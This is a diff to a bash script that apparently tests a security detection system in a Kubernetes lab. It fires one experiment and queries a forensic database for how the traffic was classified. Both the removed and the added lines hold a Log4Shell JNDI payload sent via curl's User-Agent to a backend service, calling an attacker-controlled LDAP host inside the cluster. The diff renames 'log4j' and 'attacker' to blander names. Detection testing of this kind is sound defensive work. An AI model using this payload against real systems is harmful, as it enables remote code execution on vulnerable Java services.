@@ -7,14 +7,14 @@
 # Uses the current kubectl context. Terminology: experiment, never "attack".
 #
 # Usage:  ./run-experiment.sh [EXPERIMENT] [REPLICAS] [WINDOW_S]
-#   EXPERIMENT : log4j (default) | react2argo | argocd   (only log4j fires here;
+#   EXPERIMENT : java-poc (default) | react2argo | argocd   (only java-poc fires here;
 #                others print a manual-fire hint so this script stays self-contained)
 #   REPLICAS   : replicas PER confusion variant (recon + fileread). default 25
 #   WINDOW_S   : measurement window seconds. default 150
 set -uo pipefail
 HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
-EXP="${1:-log4j}"; REPLICAS="${2:-25}"; WIN="${3:-150}"
-LNS="${LOG4J_NS:-log4j-poc}"; HONEY="${DX_NS:-honey}"
+EXP="${1:-java-poc}"; REPLICAS="${2:-25}"; WIN="${3:-150}"
+LNS="${JAVA_POC_NS:-java-poc}"; HONEY="${DX_NS:-honey}"
 CHNS="${CH_NS:-clickhouse}"; CHPOD="${CH_POD:-chi-forensic-soc-db-soc-cluster-0-0-0}"
 say(){ echo "[$(date -u +%H:%M:%S)] $*"; }
 chq(){ kubectl exec -n "$CHNS" "$CHPOD" -c clickhouse -- clickhouse-client -q "$1" 2>/dev/null; }
@@ -37,12 +37,12 @@ say "   waiting 40s for the confusion to reach steady state"; sleep 40
 M0=$(mktemp); M1=$(mktemp); snap "$M0"
 say "3. fire ONE $EXP experiment"
 case "$EXP" in
-  log4j)
+  java-poc)
     kubectl -n "$LNS" rollout restart deploy/backend >/dev/null 2>&1
     kubectl -n "$LNS" rollout status deploy/backend --timeout=120s >/dev/null 2>&1
     BIP=$(kubectl -n "$LNS" get svc backend -o jsonpath='{.spec.clusterIP}'); BPORT=$(kubectl -n "$LNS" get svc backend -o jsonpath='{.spec.ports[0].port}')
-    kubectl -n attacker-ns exec deploy/attacker -- curl -s -m6 \
-      -A '${jndi:ldap://attacker.attacker-ns.svc.cluster.local:1389/Payload}' \
+    kubectl -n pathogen-ns exec deploy/pathogen -- curl -s -m6 \
+      -A '${jndi:ldap://pathogen.pathogen-ns.svc.cluster.local:1389/Payload}' \
       "http://$BIP:$BPORT/api/products" >/dev/null 2>&1 || true ;;
   *) say "   EXPERIMENT=$EXP not auto-fired here — fire it manually now (within the window)";;
 esac
@@ -73,7 +73,7 @@ PY
 
 say "6. how dx classified the confusion (the precision result)"
 chq "SELECT multiIf(\`condition\`!='', concat('RULED_IN:',\`condition\`), edge_kind) AS outcome, count(DISTINCT requestor_pod) AS pods FROM forensic_db.dx_attack_graph WHERE requestor_pod LIKE 'confusion/%' GROUP BY outcome ORDER BY pods DESC FORMAT PrettyCompactMonoBlock"
-say "7. did the experiment rule in? (log4j-poc/backend)"
+say "7. did the experiment rule in? (java-poc/backend)"
 chq "SELECT \`condition\`, count() edges FROM forensic_db.dx_attack_graph WHERE requestor_pod LIKE '${LNS}/backend%' AND \`condition\`!='' GROUP BY \`condition\` FORMAT PrettyCompactMonoBlock"
 rm -f "$M0" "$M1"
 say "DONE — experiment=$EXP replicas=$REPLICAS window=${WIN}s"
